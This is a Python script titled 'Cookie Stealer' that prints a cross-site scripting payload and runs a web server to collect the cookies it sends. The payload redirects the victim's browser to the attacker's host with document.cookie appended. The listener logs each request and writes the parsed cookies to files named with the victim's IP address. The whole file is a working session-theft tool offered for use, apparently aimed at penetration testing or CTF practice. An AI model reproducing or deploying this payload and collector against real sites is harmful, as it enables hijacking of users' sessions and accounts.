import argparse
import datetime
import json
import http.server
import os
import socketserver
import urllib
import urllib.parse
from urllib.parse import urlparse, parse_qs, parse_qsl
from urllib.parse import unquote
from datetime import datetime

def banner():
    banner = """
     ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗███████╗    ███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗ 
    ██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██║██╔════╝    ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗
    ██║     ██║   ██║██║   ██║█████╔╝ ██║█████╗      ███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝
    ██║     ██║   ██║██║   ██║██╔═██╗ ██║██╔══╝      ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
    ╚██████╗╚██████╔╝╚██████╔╝██║  ██╗██║███████╗    ███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║
     ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝    ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
 
    Created by eMVee

    """
    print(banner)

def generate_payload(webserver_url):
    payload = '<script type="text/javascript">'
    payload += "\n"
    payload += f"   document.location='{webserver_url}/c='+document.cookie;"
    payload += "\n"
    payload += "</script>"
    payload += "\n"
    print(payload)

def parse_cookies(timedate, cookies_string, ip_addr):
    input_text = cookies_string
    # Find the index of the beginning of the query string
    index_of_question_mark = input_text.find('?')
    # If there is no query string, use the entire input_text string
    if index_of_question_mark == -1:
        query_string = input_text
    else:
        # Extract the query string
        query_string = input_text[index_of_question_mark + 1:]
    # Split the query string into its components
    components = query_string.split('&')
    # Initialize an empty dictionary to hold the cookie data
    cookie_data = {}
    # Loop through the components and extract the cookie data
    for component in components:
        key_value = component.split('=')
        key = urllib.parse.unquote(key_value[0])
        value = urllib.parse.unquote(key_value[1])
        cookie_data[key] = value
    # Save the data to a file
    time_date = timedate
    ip_address = ip_addr

    # Open the file in write mode
    filename = f'{time_date}-{ip_address}-readable_cookies.txt'
    with open(filename, 'w') as f:
        print('Cookie data:', file=f)
        for key, value in cookie_data.items():
            print(f'{key}: {value}', file=f)   
    print(f"[!] The clear text cookies are stored in {filename}")
    
    # Print the cookie data on screen
    print('[-] Cookie data:')
    for key, value in cookie_data.items():
        print(f'{key}: {value}')

def write_cookie_log(timedate, cookie, ip_addr):
    time_date = timedate
    ip_address = ip_addr
    # Convert the cookie dictionary to a JSON string
    cookie_json = json.dumps(cookie)
    # Create a filename using the date and time and IP address
    filename = f"{time_date}-{ip_address}.txt"
    # Write the JSON string to the file
    with open(filename, "w") as f:
        f.write(cookie_json)   
    print(f"[!] The cookies as received are stored in {filename}")

class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        # Get the current date and time
        now = datetime.now()
        # Format the date and time as yyyymmdd--hhmmss
        timestamp = now.strftime("%Y%m%d--%H%M%S")
        print("[+] Yummmy got some cookies")
        write_cookie_log(timestamp, self.path, self.client_address[0])
        parse_cookies(timestamp, self.path, self.client_address[0])
        
        print('\n')
        print(110 * '=')
        print('\n')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Start a webserver on a specified IP address and port.")
    parser.add_argument("ip", nargs="?", default="0.0.0.0", help="The IP address to serve on. Default is 0.0.0.0.")
    parser.add_argument("port", nargs="?", type=int, default=80, help="The port to serve on. Default is 80.")
    args = parser.parse_args()

    with socketserver.TCPServer((args.ip, args.port), MyHttpRequestHandler) as httpd:
        banner()
        print(110 * '=')
        print(f"[+] Serving on http://{args.ip,}:{args.port}")
        print("[+] Time started: " + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")))
        #print(f"[+] Saving log to: {httpd.log_filename}")
        print(110 * '=')
        print("[!] The XSS payload should be;\n")
        generate_payload(f"http://{args.ip,}:{args.port}")
        print(110 * '=')
        httpd.serve_forever()
